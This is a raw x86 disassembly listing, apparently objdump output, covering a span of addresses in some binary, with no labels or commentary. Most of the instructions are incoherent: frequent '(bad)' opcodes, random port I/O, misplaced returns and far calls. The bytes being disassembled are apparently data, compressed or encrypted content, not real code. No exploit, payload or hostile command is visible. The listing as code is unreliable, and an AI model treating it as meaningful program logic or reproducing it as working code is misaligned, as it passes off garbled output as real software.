  485b9e:	call   0xc7a7b448
  485ba3:	pop    es
  485ba4:	jae    0x485b47
  485ba6:	xor    BYTE PTR [eax],ch
  485ba8:	pop    ss
  485ba9:	iret   
  485baa:	inc    ecx
  485bab:	retf   
  485bac:	(bad)
  485baf:	xchg   ebx,eax
  485bb0:	daa    
  485bb1:	xor    DWORD PTR [edi],ecx
  485bb3:	xlat   BYTE PTR ds:[ebx]
  485bb4:	sbb    BYTE PTR [ebp+0x3f],bl
  485bb7:	push   edi
  485bb8:	ja     0x485b90
  485bba:	xor    BYTE PTR [edx+eax*1+0x5b],dh
  485bbe:	inc    ebp
  485bbf:	out    dx,eax
  485bc0:	jecxz  0x485c28
  485bc2:	ins    DWORD PTR es:[edi],dx
  485bc3:	add    BYTE PTR [ebx],0x57
  485bc6:	inc    ecx
  485bc7:	sahf   
  485bc8:	xor    DWORD PTR [edx],edi
  485bca:	mov    ah,0x9f
  485bcc:	fist   WORD PTR [edi+0x3e]
  485bcf:	mov    cl,0x60
  485bd1:	cwde   
  485bd2:	rol    DWORD PTR [edx+0x6f],cl
  485bd5:	out    dx,eax
  485bd6:	loopne 0x485bda
  485bd8:	pop    ss
  485bd9:	add    dh,BYTE PTR [ebx-0x753e99d]
  485bdf:	(bad)  
  485be0:	mov    esi,0x62f31f7b
  485be5:	sub    al,0x36
  485be7:	push   ds
  485be8:	push   ebx
  485be9:	fcmovnu st,st(7)
  485beb:	xchg   edi,eax
  485bec:	add    BYTE PTR [esi],cl
  485bee:	mov    cl,0x5b
  485bf0:	or     DWORD PTR [ebx-0x3cbf4e89],0x77
  485bf7:	iret   
  485bf8:	inc    esi
  485bf9:	loopne 0x485c24
  485bfb:	xor    DWORD PTR [ecx-0x29],ecx
  485bfe:	(bad)  [ebp+ebp*2-0x3ce074fb]
  485c05:	inc    edi
  485c06:	dec    eax
  485c07:	mov    eax,ds:0x7fef3ab6
  485c0c:	scas   al,BYTE PTR es:[edi]
  485c0d:	mov    ch,0xa3
  485c0f:	push   ecx
  485c10:	mov    bh,0x8b
  485c12:	pop    edi
  485c13:	aas    
  485c14:	mov    al,0x2
  485c16:	js     0x485c3d
  485c18:	ficom  WORD PTR [ebx+0x5ba49a6d]
  485c1e:	dec    ebx
  485c1f:	jle    0x485bf8
  485c21:	xor    al,0xb7
  485c23:	pop    eax
  485c24:	mov    BYTE PTR [edx-0x46],cl
  485c27:	push   esi
  485c28:	scas   eax,DWORD PTR es:[edi]
  485c29:	push   DWORD PTR [eax+0x450686ad]
  485c2f:	daa    
  485c30:	das    
  485c31:	xlat   BYTE PTR ds:[ebx]
  485c32:	push   0x0
  485c34:	sub    esp,DWORD PTR [edi]
  485c36:	mov    bl,0x3f
  485c38:	and    al,0xaa
  485c3a:	add    al,0x4b
  485c3c:	jg     0x485c25
  485c3e:	xchg   ebx,eax
  485c3f:	rcl    BYTE PTR [ecx],0x5c
  485c42:	dec    edi
  485c43:	daa    
  485c44:	cmp    DWORD PTR [ebx+edi*4-0x3c],ebp
  485c48:	mov    dh,0xb7
  485c4a:	mov    edi,0xfa9f87e3
  485c4f:	les    edx,FWORD PTR [edi+0x264f3746]
  485c55:	sub    DWORD PTR [ebp+0x17],eax
  485c58:	jg     0x485c81
  485c5a:	push   edi
  485c5b:	or     eax,0x1f0c155a
  485c60:	fbld   TBYTE PTR [ecx+0x178a388d]
  485c66:	xor    al,bh
  485c68:	sub    bh,BYTE PTR [eax-0x2c]
  485c6b:	mov    edx,0x6e7f77ff
  485c70:	test   DWORD PTR [edx-0x26],edx
  485c73:	fucomip st,st(7)
  485c75:	push   edx
  485c76:	rcl    esi,0x8d
  485c79:	or     bh,dl
  485c7b:	sub    esi,DWORD PTR [ecx]
  485c7d:	fistp  QWORD PTR [edi]
  485c7f:	inc    ecx
  485c80:	sub    BYTE PTR [edx+0x28071f50],al
  485c86:	jbe    0x485c14
  485c88:	bound  esp,QWORD PTR [edi+0x756adfc7]
  485c8e:	lods   al,BYTE PTR ds:[esi]
  485c8f:	sub    eax,0x36b7cfdf
  485c94:	jmp    0x44403c0f
  485c99:	pop    edi
  485c9a:	fild   QWORD PTR [eax+0xb]
  485c9d:	inc    esi
  485c9e:	mov    ebx,0xdf07d79e
  485ca3:	jno    0x485c59
  485ca5:	push   ebp
  485ca6:	lea    ebx,[edi-0x4798cea1]
  485cac:	ins    DWORD PTR es:[edi],dx
  485cad:	adc    DWORD PTR [edi+0x77],esi
  485cb0:	jmp    0x485c59
  485cb2:	(bad)  
  485cb3:	jo     0x485d25
  485cb5:	test   al,0xc7
  485cb7:	daa    
  485cb8:	movd   mm3,DWORD PTR [edi]
  485cbb:	cs (bad) 
  485cbd:	call   DWORD PTR [edi]
  485cbf:	jnp    0x485c50
  485cc1:	xor    al,ch
  485cc3:	inc    esp
  485cc4:	and    dl,BYTE PTR [esi-0x7caba0c9]
  485cca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  485ccb:	xchg   edi,ebx
  485ccd:	pop    edi
  485cce:	ret    
  485ccf:	imul   ebp,DWORD PTR [ebx],0x7af4b58
  485cd5:	xchg   DWORD PTR [ebp-0x5d],eax
  485cd8:	mov    eax,0xa7362f5a
  485cdd:	pop    edi
  485cde:	add    BYTE PTR [ecx-0x2b],0xb
  485ce2:	add    ebp,DWORD PTR [edi+0x5f]
  485ce5:	inc    eax
  485ce6:	pop    edx
  485ce7:	inc    edi
  485ce8:	and    BYTE PTR [edi],bl
  485cea:	pusha  
  485ceb:	ins    DWORD PTR es:[edi],dx
  485cec:	repnz lods eax,DWORD PTR ds:[esi]
  485cee:	pop    ds
  485cef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485cf0:	inc    ebx
  485cf1:	mov    edi,0x552831c3
  485cf6:	pop    edi
  485cf7:	pop    ss
  485cf8:	inc    ecx
  485cf9:	idiv   DWORD PTR [edx]
  485cfb:	jo     0x485c80
  485cfd:	sbb    eax,0xb78f2f34
  485d02:	push   es
  485d03:	add    DWORD PTR [ecx-0x7d58e0a7],ebp
  485d09:	dec    ebp
  485d0a:	shl    BYTE PTR [esi+0x601f4f3f],0x6f
  485d11:	push   ebp
  485d12:	or     al,0x2f
  485d14:	(bad)  
  485d15:	mov    edi,0x6082b684
  485d1a:	xor    al,0x3f
  485d1c:	jg     0x485d63
  485d1e:	inc    ecx
  485d1f:	sub    eax,0xf91f772a
  485d24:	ins    BYTE PTR es:[edi],dx
  485d25:	shr    BYTE PTR [eax+0x17],0xef
  485d29:	xor    esp,DWORD PTR [eax+0x1f094b36]
  485d2f:	mov    DWORD PTR [eax+0x3a],ebx
  485d32:	mov    al,ds:0x60ff395f
  485d37:	add    BYTE PTR [esi-0x80],dl
  485d3a:	inc    ebx
  485d3b:	pop    edi
  485d3c:	inc    edi
  485d3d:	cmp    dl,dl
  485d3f:	or     dh,BYTE PTR [eax+0x295547f7]
  485d45:	sub    eax,0x9f46ce9d
  485d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  485d4b:	cmp    BYTE PTR [edx],0x82
  485d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485d4f:	inc    edx
  485d50:	idiv   DWORD PTR [ebp+0xa]
  485d53:	cmp    esi,DWORD PTR [edx]
  485d55:	scas   eax,DWORD PTR es:[edi]
  485d56:	imul   ebx
  485d58:	xchg   ebx,eax
  485d59:	xchg   ecx,eax
  485d5a:	fdiv   st,st(2)
  485d5c:	scas   eax,DWORD PTR es:[edi]
  485d5d:	xor    BYTE PTR [edi+0x8aec5df],bl
  485d63:	pop    edx
  485d64:	aas    
  485d65:	ss pop ds
  485d67:	push   esi
  485d68:	pop    ss
  485d69:	jo     0x485d17
  485d6b:	daa    
  485d6c:	mov    edi,0x8ac094b5
  485d71:	pop    ds
  485d72:	out    0xbf,eax
  485d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  485d75:	xchg   esi,eax
  485d76:	cmp    ch,BYTE PTR [eax-0x5127c069]
  485d7c:	rcl    DWORD PTR [esi],0x7
  485d7f:	fistp  QWORD PTR [edi-0x31]
  485d82:	imul   eax,eax,0x3734e4c1
  485d88:	inc    edi
  485d89:	sub    al,0xb1
  485d8b:	push   ebp
  485d8c:	sbb    edi,esi
  485d8e:	jg     0x485daf
  485d90:	pop    eax
  485d91:	enter  0x4c85,0x33
  485d95:	xor    al,0xb6
  485d97:	ins    BYTE PTR es:[edi],dx
  485d98:	push   ebp
  485d99:	sub    al,0x7
  485d9b:	out    dx,eax
  485d9c:	xchg   edi,eax
  485d9d:	xchg   DWORD PTR [ecx*1+0x353f3839],ebp
  485da4:	dec    edx
  485da5:	daa    
  485da6:	rcl    DWORD PTR [esi-0x61],cl
  485da9:	das    
  485daa:	inc    edx
  485dab:	inc    ecx
  485dac:	adc    DWORD PTR [ebx+ebx*8],ecx
  485daf:	jbe    0x485db0
  485db1:	lahf   
  485db2:	push   edi
  485db3:	xor    bl,bh
  485db5:	pop    ebx
  485db6:	mov    dh,0xa
  485db8:	imul   esi,DWORD PTR [edi+0x11509fdf],0xffffffb5
  485dbf:	ins    DWORD PTR es:[edi],dx
  485dc0:	pop    ds
  485dc1:	das    
  485dc2:	out    0x56,eax
  485dc4:	popa   
  485dc5:	mov    bl,0x81
  485dc7:	cmp    eax,DWORD PTR [edi-0x5e]
  485dca:	adc    eax,0x1a4be703
  485dcf:	pop    ds
  485dd0:	out    dx,eax
  485dd1:	push   esi
  485dd2:	add    DWORD PTR ds:0x890f0723,0x83f1da88
  485ddc:	xchg   edi,esi
  485dde:	and    BYTE PTR fs:[eax],0x15
  485de2:	aas    
  485de3:	pop    edi
  485de4:	xor    BYTE PTR [eax-0x603eaa78],ch
  485dea:	stos   BYTE PTR es:[di],al
  485dec:	inc    esi
  485ded:	add    DWORD PTR [edi+ebp*1],esp
  485df0:	fistp  WORD PTR [eax+0x1]
  485df3:	push   esi
  485df4:	adc    al,0xdf
  485df6:	outs   dx,DWORD PTR ds:[esi]
  485df7:	imul   ebx,DWORD PTR [eax+0x60],0x2c
  485dfb:	dec    edi
  485dfc:	pop    ds
  485dfd:	das    
  485dfe:	push   ecx
  485dff:	xor    DWORD PTR [edi+0x7f3fc701],0x2b890a56
  485e09:	aas    
  485e0a:	iret   
  485e0b:	sbb    ebx,0xffc2e36e
  485e11:	out    0x43,eax
  485e13:	adc    BYTE PTR [ebx+eiz*2+0x1a],bl
  485e17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485e18:	inc    esi
  485e19:	out    dx,eax
  485e1a:	aaa    
  485e1b:	bound  eax,QWORD PTR ds:0x9f3901db
  485e21:	pop    es
  485e22:	or     bl,bl
  485e24:	inc    ebp
  485e25:	mov    dh,0x9b
  485e27:	das    
  485e28:	das    
  485e29:	neg    DWORD PTR [eax-0x10]
  485e2c:	inc    esp
  485e2d:	cmp    al,0xc7
  485e2f:	addr16 dec edi
  485e31:	jle    0x485e4d
  485e33:	dec    edi
  485e34:	iret   
  485e35:	out    dx,eax
  485e36:	ret    
  485e37:	mov    bh,0x33
  485e39:	add    DWORD PTR [eax],edi
  485e3b:	mov    al,0x4d
  485e3d:	dec    edi
  485e3e:	addr16 add al,0x98
  485e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  485e42:	dec    ecx
  485e43:	out    dx,al
  485e44:	cmp    BYTE PTR [edi+esi*1+0x49],al
  485e48:	sbb    eax,0x976606e8
  485e4d:	pop    eax
  485e4e:	jb     0x485e11
  485e50:	push   eax
  485e51:	lahf   
  485e52:	xor    edx,edi
  485e54:	inc    ebp
  485e55:	clc    
  485e56:	aam    0x26
  485e58:	ins    DWORD PTR es:[edi],dx
  485e59:	mov    edi,0x93120fdf
  485e5e:	xchg   ebx,eax
  485e5f:	sub    edi,DWORD PTR [edi+0x31]
  485e62:	xor    eax,0xe490bb0d
  485e67:	xchg   esi,eax
  485e68:	inc    ebp
  485e69:	lahf   
  485e6a:	xchg   edi,eax
  485e6b:	push   esp
  485e6c:	push   edx
  485e6d:	adc    esp,DWORD PTR [edx-0x29]
  485e70:	xor    al,0x27
  485e72:	add    ebx,DWORD PTR [ebx-0x50c0de4f]
  485e78:	lds    eax,FWORD PTR [ebp-0x28f04f48]
  485e7e:	pop    esi
  485e7f:	xchg   DWORD PTR [eax+0x57],ebx
  485e82:	mov    ah,0x61
  485e84:	aaa    
  485e85:	mov    edi,0x6c007541
  485e8a:	push   ebp
  485e8b:	mov    bh,0x3
  485e8d:	xor    eax,DWORD PTR [ecx]
  485e8f:	(bad)  [eax+0xb]
  485e92:	iret   
  485e93:	pop    ds
  485e94:	add    ecx,DWORD PTR [eax-0x46]
  485e97:	lods   al,BYTE PTR ds:[esi]
  485e98:	push   ebp
  485e99:	lahf   
  485e9a:	fidiv  WORD PTR [edi]
  485e9c:	cdq    
  485e9d:	xchg   ecx,eax
  485e9e:	sbb    bl,BYTE PTR [edx+0xf]
  485ea1:	cmp    bh,bl
  485ea3:	inc    ebp
  485ea4:	fiadd  DWORD PTR [edx-0x52]
  485ea7:	sub    eax,0x8b7f321f
  485eac:	inc    ebp
  485ead:	mov    edx,DWORD PTR [eax]
  485eaf:	aas    
  485eb0:	(bad)  
  485eb1:	inc    edx
  485eb3:	sub    dh,BYTE PTR [ecx-0x5668c07e]
  485eb9:	push   esp
  485eba:	push   ecx
  485ebb:	sub    ecx,DWORD PTR [edi-0x15cbc842]
  485ec1:	bound  eax,QWORD PTR [ebx+0x2]
  485ec4:	(bad)  
  485ec5:	jecxz  0x485f33
  485ec7:	mov    eax,ds:0x1f9f42ad
  485ecc:	add    esi,DWORD PTR [eax+0x4f7c1020]
  485ed2:	(bad)  
  485ed3:	aas    
  485ed4:	xor    eax,0x7fba608a
  485ed9:	xor    al,0x7f
  485edb:	test   eax,0x6f210018
  485ee0:	pop    ss
  485ee1:	mov    ds:0x3f0558a0,eax
  485ee6:	aas    
  485ee7:	(bad)  
  485ee8:	xchg   esi,eax
  485ee9:	mov    eax,0x1f4f39a9
  485eee:	lds    ebx,FWORD PTR [edx+0x47]
  485ef1:	bound  esp,QWORD PTR [edi]
  485ef3:	push   edi
  485ef4:	test   DWORD PTR [ebp+ebp*1+0xe],0x90bb9721
  485efc:	(bad)  
  485efd:	(bad)  
  485efe:	das    
  485eff:	aas    
  485f00:	outs   dx,DWORD PTR ds:[esi]
  485f01:	fbld   TBYTE PTR [edx+0x72]
  485f04:	mov    al,0x6d
  485f06:	(bad)  
  485f07:	pop    ds
  485f08:	inc    esi
  485f09:	loope  0x485f74
  485f0b:	adc    eax,0x9b173fa1
  485f10:	mov    dl,0xde
  485f12:	push   es
  485f13:	lods   al,BYTE PTR ds:[esi]
  485f14:	mov    bh,0x3f
  485f16:	das    
  485f17:	loopne 0x485ea6
  485f19:	jbe    0x485f86
  485f1b:	fbstp  TBYTE PTR [esi+0x5aa8675f]
  485f21:	ins    DWORD PTR es:[edi],dx
  485f22:	push   ebp
  485f23:	daa    
  485f24:	pop    edi
  485f25:	ja     0x485f3f
  485f27:	push   esp
  485f28:	dec    eax
  485f29:	push   ebx
  485f2a:	das    
  485f2b:	pop    ds
  485f2c:	pop    es
  485f2d:	ss pusha 
  485f2f:	inc    ebp
  485f30:	aas    
  485f31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485f32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485f33:	sub    DWORD PTR [esi-0x6040a930],eax
  485f39:	mov    bh,0x26
  485f3b:	cmp    eax,0x66dfbf01
  485f40:	ror    DWORD PTR [ebp-0x53],0x43
  485f44:	(bad)  
  485f46:	mov    cl,0xb6
  485f48:	cmp    dh,BYTE PTR [ecx]
  485f4a:	xor    al,0xbf
  485f4c:	aas    
  485f4d:	sub    eax,0x8f380c2a
  485f52:	pop    edi
  485f53:	imul   ebp,DWORD PTR [ebx+0x372f86b0],0x2f
  485f5a:	das    
  485f5b:	mov    eax,ds:0x1715ac2a
  485f60:	aas    
  485f61:	adc    BYTE PTR [ebx+0x14],bl
  485f64:	pop    ecx
  485f65:	aas    
  485f66:	add    ebp,DWORD PTR [ebx+0x35c66842]
  485f6c:	scas   eax,DWORD PTR es:[edi]
  485f6d:	out    dx,eax
  485f6e:	pusha  
  485f6f:	mov    WORD PTR [eax+0x5],cs
  485f72:	outs   dx,DWORD PTR ds:[esi]
  485f73:	iret   
  485f74:	xchg   ecx,eax
  485f75:	xor    eax,0x9f5f894d
  485f7a:	xor    eax,0x2935b53f
  485f7f:	inc    eax
  485f80:	out    dx,eax
  485f81:	scas   eax,DWORD PTR es:[edi]
  485f82:	lds    ebp,FWORD PTR [esi+0x4f5fbc4a]
  485f88:	ss iret 
  485f8a:	add    ah,BYTE PTR [esi+edx*4]
  485f8d:	mov    ?,WORD PTR [edi-0x51]
  485f90:	lahf   
  485f91:	popa   
  485f92:	and    DWORD PTR [ebx],esi
  485f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  485f95:	outs   dx,DWORD PTR ds:[esi]
  485f96:	inc    ebx
  485f97:	rol    DWORD PTR [edx+0x5f6715b5],0xdf
  485f9e:	pop    edi
  485f9f:	ret    
  485fa0:	mov    al,ds:0x2f4252e3
  485fa5:	das    
  485fa6:	sub    dl,BYTE PTR [eax+0x22]
  485fa9:	dec    eax
  485faa:	lahf   
  485fab:	jmp    edx
  485fad:	rol    BYTE PTR [eax],0xc7
  485fb0:	pop    ds
  485fb1:	cmp    BYTE PTR [edi+0x446c02d8],bh
  485fb7:	call   FWORD PTR [edi]
  485fb9:	aas    
  485fba:	mov    ah,0x2a
  485fbc:	jno    0x485f4c
  485fbe:	inc    esi
  485fbf:	outs   dx,DWORD PTR ds:[esi]
  485fc0:	test   BYTE PTR [esp+esi*1+0xa],al
  485fc4:	pop    es
  485fc5:	pop    edi
  485fc6:	pusha  
  485fc7:	and    BYTE PTR [edx-0x6b],bl
  485fca:	jmp    DWORD PTR [edi]
  485fcc:	xor    dl,BYTE PTR ds:0x1f1462ab
  485fd2:	jg     0x486013
  485fd4:	arpl   WORD PTR [ebx+0x34],bx
  485fd7:	pop    esp
  485fd8:	inc    esi
  485fd9:	aas    
  485fda:	pop    ds
  485fdb:	jne    0x486009
  485fdd:	(bad)
  485fe2:	mov    eax,ds:0x8f6c6935
  485fe7:	mov    edi,0xbb10b763
  485fec:	ja     0x6bf60fe8
  485ff2:	mov    cl,BYTE PTR [ecx+eax*2+0xb7f36b7]
  485ff9:	sbb    eax,DWORD PTR [ecx-0x50309095]
  485fff:	dec    eax
  486000:	and    DWORD PTR [esi+0x38364277],ecx
  486006:	inc    ebx
  486007:	outs   dx,BYTE PTR ds:[esi]
  486008:	xor    eax,0x470f86b1
  48600d:	shr    DWORD PTR es:[edx+0x1fef15c6],0xdf
  486015:	pop    ebp
  486016:	shr    DWORD PTR [edx+0x348faf05],0x5
  48601d:	fidiv  DWORD PTR [eax]
  48601f:	sub    BYTE PTR [edi-0x11],0xc7
  486023:	fisttp DWORD PTR [ebp-0x60cdb3b1]
  486029:	dec    edi
  48602a:	daa    
  48602b:	dec    ebx
  48602c:	ins    BYTE PTR es:[edi],dx
  48602d:	mov    ebx,0x17a73275
  486032:	pop    ss
  486033:	sbb    eax,0xfad4620
  486038:	(bad)  
  486039:	fimul  DWORD PTR [eax]
  48603b:	push   ds
  48603c:	mov    dl,0xb3
  48603e:	pop    edi
  48603f:	scas   eax,DWORD PTR es:[edi]
  486040:	ja     0x486008
  486042:	sbb    ch,BYTE PTR [esi-0x5af0a04c]
  486048:	imul   BYTE PTR ds:0x4787a72d
  48604e:	test   DWORD PTR [eax],esi
  486050:	mov    dh,0x85
  486052:	xchg   edi,eax
  486053:	(bad)  
  486054:	pop    ds
  486055:	daa    
  486056:	fiadd  WORD PTR ds:0x77467056
  48605c:	pop    ds
  48605d:	ja     0x4860a2
  48605f:	and    cl,ch
  486061:	mov    ah,0xe
  486063:	xor    al,0xf
  486065:	pop    edx
  486066:	sbb    ebx,DWORD PTR [ebp+0x43]
  486069:	inc    esp
  48606a:	lahf   
  48606b:	jg     0x486047
  48606d:	(bad)  
  48606e:	push   esi
  48606f:	add    eax,0x808f3f6f
  486074:	adc    bl,al
  486076:	push   0x3f
  486078:	das    
  486079:	xor    eax,0x4fc18780
  48607e:	ud0    eax,DWORD PTR [edx+0xe]
  486082:	jbe    0x4860df
  486084:	xchg   edi,eax
  486085:	inc    edx
  486086:	pop    ds
  486087:	xor    al,0xd6
  486089:	ins    BYTE PTR es:[edi],dx
  48608a:	sub    al,0xe4
  48608c:	cmp    BYTE PTR [edi+0x2356a11a],bl
  486092:	fistp  WORD PTR [edi+0x17]
  486095:	fistp  DWORD PTR [edx+eiz*2+0x2f]
  486099:	rol    DWORD PTR [edi],cl
  48609b:	(bad)  
  48609c:	cmp    DWORD PTR [ecx],esp
  48609e:	pop    ss
  48609f:	jb     0x4860c2
  4860a1:	cmp    DWORD PTR [ecx],edi
  4860a3:	in     al,0x42
  4860a5:	cs jbe 0x4860e1
  4860a8:	jg     0x4860eb
  4860aa:	inc    ecx
  4860ab:	ret    0x21aa
  4860ae:	sub    al,0x7f
  4860b0:	jecxz  0x486104
  4860b2:	mov    ds:0xaf77df78,al
  4860b7:	xor    eax,0xa348b768
  4860bc:	add    BYTE PTR [edi],0x15
  4860bf:	xor    ch,BYTE PTR [ebp+eax*1+0x7b]
  4860c3:	pop    es
  4860c4:	xor    al,ch
  4860c6:	call   0x40cf:0x6fcb8df0
  4860cd:	xchg   BYTE PTR [ecx],al
  4860cf:	adc    eax,DWORD PTR [ebp+0x4f]
  4860d2:	aaa    
  4860d3:	call   0x808f:0x3f91d5ad
  4860da:	cs mov cl,0xa5
  4860dd:	add    edi,DWORD PTR [edi+0x22575615]
  4860e3:	das    
  4860e4:	pop    ds
  4860e5:	mov    ?,WORD PTR [ebp-0x54]
  4860e8:	arpl   WORD PTR [ecx+0x35],cx
  4860eb:	mov    bh,0xdf
  4860ed:	adc    edx,DWORD PTR [eax]
  4860ef:	test   al,0x20
  4860f1:	pop    edi
  4860f2:	addr16 push edx
  4860f4:	mov    ch,0x9b
  4860f6:	sbb    ah,bh
  4860f8:	daa    
  4860f9:	sar    bl,cl
  4860fb:	jp     0x48611d
  4860fd:	daa    
  4860fe:	dec    edi
  4860ff:	and    ebp,DWORD PTR ds:0x8f2e0029
  486105:	xor    DWORD PTR [esi+0x45],esp
  486108:	pusha  
  486109:	or     eax,0xf5f6289
  48610e:	aad    0x2a
  486110:	xchg   ecx,eax
  486111:	mov    dh,0x4f
  486113:	pop    ds
  486114:	xchg   edi,eax
  486115:	mov    bh,0x94
  486117:	dec    edx
  486118:	sub    al,0xc4
  48611a:	dec    edi
  48611b:	ja     0x48611f
  48611d:	sub    eax,0xdf2f2ed1
  486122:	pop    edi
  486123:	or     ebx,DWORD PTR [ecx+edx*1]
  486126:	mov    esi,?
  486128:	aas    
  486129:	cmp    DWORD PTR [edi-0x722f722f],esi
  48612f:	mov    edi,0x187c3167
  486134:	(bad)  [edi]
  486136:	push   edi
  486137:	mov    edx,DWORD PTR [edi-0x75]
  48613a:	adc    al,0x8a
  48613c:	xor    al,0x37
  48613e:	fbstp  TBYTE PTR [edi]
  486140:	stos   DWORD PTR es:[edi],eax
  486141:	pop    edx
  486142:	out    dx,eax
  486143:	ins    DWORD PTR es:[edi],dx
  486144:	lsl    ebx,WORD PTR [edi]
  486147:	lahf   
  486148:	cs mov ebp,0x4e1f1c5b
  48614e:	xlat   BYTE PTR ds:[ebx]
  48614f:	out    0xb7,eax
  486151:	push   ecx
  486152:	clc    
  486153:	rcl    BYTE PTR [edi],cl
  486155:	jg     0x486116
  486157:	mov    esp,0xbf800155
  48615c:	pop    ss
  48615d:	cvttps2pi mm3,QWORD PTR [eax+0x65]
  486161:	pop    es
  486162:	push   edi
  486163:	jle    0x486165
  486165:	or     eax,DWORD PTR [esi]
  486167:	add    eax,0x268077f
  48616c:	mov    al,0xe
  48616e:	pop    edi
  48616f:	pop    edi
  486170:	fcmovu st,st(0)
  486172:	or     dl,BYTE PTR [eax]
  486174:	fisttp WORD PTR [edi]
  486176:	add    ebp,DWORD PTR [edx]
  486178:	cmp    BYTE PTR [edi-0x3f],al
  48617b:	push   edi
  48617c:	xor    ebx,DWORD PTR [edi+0x58]
  48617f:	ret    
  486180:	push   0xffffffd6
  486182:	daa    
  486183:	lahf   
  486184:	sbb    eax,0xe600e4c6
  486189:	xlat   BYTE PTR ss:[ebx]
  48618b:	inc    edx
  48618c:	dec    esp
  48618d:	fiadd  DWORD PTR [ecx-0x3e7a80f1]
  486193:	push   0x4
  486195:	push   edi
  486196:	mul    DWORD PTR [edi]
  486198:	fmul   DWORD PTR [ebp+0x37365bcb]
  48619e:	xor    DWORD PTR [edi+0x56],ecx
  4861a1:	test   BYTE PTR [edx+0xc],cl
  4861a4:	dec    edi
  4861a5:	scas   eax,DWORD PTR es:[edi]
  4861a6:	pop    edx
  4861a7:	pop    edi
  4861a8:	cmp    BYTE PTR [edx+0x50604f3f],ah
  4861ae:	add    DWORD PTR [edi+edx*1+0x468b5db7],ebp
  4861b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4861b6:	pop    edi
  4861b7:	jg     0x4861f8
  4861b9:	and    eax,DWORD PTR [esi+0x33c761ab]
  4861bf:	fistp  WORD PTR [ebx]
  4861c1:	ins    DWORD PTR es:[edi],dx
  4861c2:	sub    ch,BYTE PTR [edi+ebp*1+0x67]
  4861c6:	xor    dh,BYTE PTR [edi]
  4861c8:	pop    ss
  4861c9:	inc    ecx
  4861ca:	sub    bl,BYTE PTR [eax+0x6d]
  4861cd:	jg     0x4861fe
  4861cf:	pop    es
  4861d0:	shl    DWORD PTR [eax-0x3074a566],0xd8
  4861d7:	push   esi
  4861d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4861d9:	sbb    al,bh
  4861db:	pop    es
  4861dc:	pop    es
  4861dd:	adc    BYTE PTR [ebp-0x4b],0x42
  4861e1:	jecxz  0x4861ea
  4861e3:	or     al,0x66
  4861e5:	pusha  
  4861e6:	inc    ecx
  4861e7:	pop    es
  4861e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4861e9:	test   DWORD PTR [eax+0x3f2361d1],eax
  4861ef:	dec    eax
  4861f0:	or     eax,0xff7f5847
  4861f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4861f6:	aaa    
  4861f7:	stos   BYTE PTR es:[edi],al
  4861f8:	sub    DWORD PTR [edi+0x33],edx
  4861fb:	jg     0x4861c4
  4861fd:	mov    ebx,0x577045a9
  486202:	(bad)  
  486203:	push   ebx
  486204:	cwde   
  486205:	adc    DWORD PTR [edx-0x6010d18c],ebx
  48620b:	(bad)  
  48620c:	mov    ds:0x373f8b12,al
  486211:	xor    BYTE PTR [edi-0x6964c0de],0x5d
  486218:	or     eax,0x9f42484a
  48621d:	xor    al,0x55
  48621f:	mov    ds:0x384f0226,eax
  486224:	fild   WORD PTR [eax+0x68]
  486227:	stos   DWORD PTR es:[edi],eax
  486228:	cmp    BYTE PTR [edi+0x3f],0x6f
  48622c:	adc    DWORD PTR [eax-0x70c7b09d],eax
  486232:	pop    ss
  486233:	shr    BYTE PTR [eax-0x5cbc5b67],0x35
  48623a:	fisttp WORD PTR [edx]
  48623c:	dec    ebp
  48623d:	ficom  DWORD PTR [edx-0x7d]
  486240:	psrld  mm2,mm2
  486243:	lods   eax,DWORD PTR ds:[esi]
  486244:	inc    ebx
  486245:	(bad)  
  486246:	aaa    
  486247:	inc    ecx
  486248:	(bad)  
  486249:	sub    al,BYTE PTR [edx]
  48624b:	lahf   
  48624c:	pop    ss
  48624d:	inc    edi
  48624e:	xor    edx,DWORD PTR [esi+esi*4]
  486251:	aad    0xa3
  486253:	aaa    
  486254:	or     esi,DWORD PTR [edi]
  486256:	push   cs
  486257:	add    DWORD PTR ss:[eax+0x7],ebx
  48625b:	adc    edi,DWORD PTR [eax+0x29]
  48625e:	ins    BYTE PTR es:[edi],dx
  48625f:	and    cl,bl
  486261:	aaa    
  486262:	cmp    BYTE PTR [esi],bl
  486264:	adc    BYTE PTR [esi],ch
  486266:	push   ebp
  486267:	push   edi
  486268:	cmp    ecx,DWORD PTR [ebx+0x294b5537]
  48626e:	add    BYTE PTR [edi+0x17],ch
  486271:	iret   
  486272:	js     0x486203
  486274:	mov    BYTE PTR [edi+0x36],al
  486277:	inc    edi
  486278:	addr16 push ebp
  48627a:	pop    esp
  48627b:	pop    eax
  48627c:	inc    edi
  48627d:	out    dx,eax
  48627e:	mov    bh,0x2f
  486280:	(bad)  
  486281:	int    0xf0
  486283:	mov    dh,0x37
  486285:	out    dx,eax
  486286:	pop    edi
  486287:	xor    eax,0x62ee3b37
  48628c:	int    0xf7
  48628e:	aaa    
  48628f:	xlat   BYTE PTR ds:[ebx]
  486290:	push   ss
  486291:	jnp    0x486246
  486293:	mov    al,0x66
  486295:	or     bh,BYTE PTR [edi-0x39]
  486298:	mov    dh,0x8e
  48629a:	or     ebp,edx
  48629c:	xor    eax,0x8b4f1f43
  4862a1:	and    DWORD PTR [ebp+edx*8-0x51],ebx
  4862a5:	inc    edx
  4862a6:	imul   eax,DWORD PTR [ebx+0x470d6a47],0x7f
  4862ad:	(bad)  
  4862ae:	push   cs
  4862af:	sub    BYTE PTR [ebx],0x20
  4862b2:	mov    DWORD PTR [edi+ebx*8+0x39],0x26641562
  4862ba:	mov    edx,DWORD PTR [edi+0x2b82b591]
  4862c0:	addr16 daa 
  4862c2:	mov    DWORD PTR ds:0xeb41a18e,0xe5b9deda
  4862cc:	ret    
  4862cd:	inc    ebx
